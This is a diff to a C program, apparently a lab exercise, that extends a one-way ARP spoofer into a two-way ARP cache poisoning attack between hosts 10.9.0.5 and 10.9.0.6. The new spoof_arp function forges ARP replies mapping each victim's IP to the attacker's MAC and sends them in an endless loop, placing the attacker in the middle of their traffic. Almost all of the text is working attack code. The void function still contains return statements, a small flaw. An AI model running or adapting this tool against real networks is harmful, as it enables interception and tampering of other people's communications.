@@ -12,6 +12,10 @@
 
 #include "packets.h"
 
+#define CHARTOMAC(cmac,mac) \
+    sscanf((cmac),"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",\
+           &(mac)[0],&(mac)[1],&(mac)[2],&(mac)[3],&(mac)[4],&(mac)[5])
+
 # define BROADCAST_ADDR (uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 
 
@@ -79,9 +83,9 @@ char broadcast_packet(const int sd,
     eth_header* eth_pkt;
 
     /* NOTE: See <net/if_ether.h> for packet opcode */
-    if (!(eth_pkt = create_arp_packet(ARPOP_REQUEST, hacker_mac,
-                                      spoof_ip, BROADCAST_ADDR,
-                                      victim_ip))) {
+    if (!(eth_pkt = create_arp_packet(ARPOP_REQUEST,
+                                      hacker_mac, spoof_ip,
+                                      BROADCAST_ADDR, victim_ip))) {
         ERROR_PACKET_CREATION_ETHER;
         return 0;
     }
@@ -149,31 +153,46 @@ uint8_t *get_victim_mac(const int sd, const char *victim_ip)
     return (victim_mac_address);
 }
 
-char send_payload_to_victim(const int sd,
-                            struct sockaddr_ll *device,
-                            const uint8_t *hacker_mac,
-                            const char *spoof_ip,
-                            const uint8_t *victim_mac,
-                            const char *victim_ip)
+void spoof_arp(const int sd, struct sockaddr_ll *device,
+               const uint8_t *hacker_mac,
+               const char *victim_ip_1, const uint8_t *victim_mac_1,
+               const char *victim_ip_2, const uint8_t *victim_mac_2)
 {
-    eth_header *arp_packet;
+    eth_header *arp_packet_1;
+    eth_header *arp_packet_2;
 
-    if (!(arp_packet = create_arp_packet(ARPOP_REPLY,
-                                         hacker_mac, spoof_ip,
-                                         victim_mac, victim_ip))) {
+    if (!(arp_packet_1 = create_arp_packet(ARPOP_REPLY,
+                                           hacker_mac, victim_ip_1,
+                                           victim_mac_2, victim_ip_2))) {
+        ERROR_PACKET_CREATION_ARP;
+        return 0;
+    }
+
+    if (!(arp_packet_2 = create_arp_packet(ARPOP_REPLY,
+                                           hacker_mac, victim_ip_2,
+                                           victim_mac_1, victim_ip_1))) {
         ERROR_PACKET_CREATION_ARP;
         return 0;
     }
 
     while (1) {
-        if ((sendto(sd, arp_packet, ARP_PKT_LEN + ETH_HDR_LEN, 0,
+        if ((sendto(sd, arp_packet_1, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                     (const struct sockaddr *)device, sizeof(*device))) <= 0) {
             ERROR_COULD_NOT_SEND;
             return 0;
         }
-        fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip);
+        fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip_2);
+        sleep(5);
+
+        if ((sendto(sd, arp_packet_2, ARP_PKT_LEN + ETH_HDR_LEN, 0,
+                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
+            ERROR_COULD_NOT_SEND;
+            return 0;
+        }
+        fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip_1);
         sleep(5);
     }
+
     return 1;
 }
 
@@ -184,16 +203,17 @@ int main(int argc, char *argv[])
     //     exit(EXIT_FAILURE);
     // }
 
-    char *victim_ip, *spoof_ip, *interface;
+    char *victim_ip_1, *victim_ip_2, *interface;
     unsigned char *hacker_mac = NULL;
-    unsigned char *victim_mac = NULL;
+    unsigned char *victim_mac_1 = NULL;
+    unsigned char *victim_mac_2 = NULL;
     int sock;
     struct sockaddr_ll device;
 
 
     // spoof_ip = argv[1]; victim_ip = argv[2]; interface = argv[3];
-    spoof_ip = "10.9.0.6";
-    victim_ip = "10.9.0.5";
+    victim_ip_1 = "10.9.0.5";
+    victim_ip_2 = "10.9.0.6";
     interface = "eth0";
 
 
@@ -233,14 +253,22 @@ int main(int argc, char *argv[])
     }
 
     if (!broadcast_packet(sock, &device, hacker_mac,
-                          spoof_ip, victim_ip)) {
+                          victim_ip_2, victim_ip_1)) {
         exit(EXIT_FAILURE);
     }
 
-    victim_mac = get_victim_mac(sock, victim_ip);
-    send_payload_to_victim(sock, &device,
-                           hacker_mac, spoof_ip,
-                           victim_mac, victim_ip);
+    victim_mac_1 = get_victim_mac(sock, victim_ip_1);
+
+    if (!broadcast_packet(sock, &device, hacker_mac,
+                          victim_ip_1, victim_ip_2)) {
+        exit(EXIT_FAILURE);
+    }
+
+    victim_mac_2 = get_victim_mac(sock, victim_ip_2);
+
+    spoof_arp(sock, &device, hacker_mac,
+              victim_ip_1, victim_mac_1,
+              victim_ip_2, victim_mac_2);
 
     if (hacker_mac != NULL) free(hacker_mac);
     close(sock);
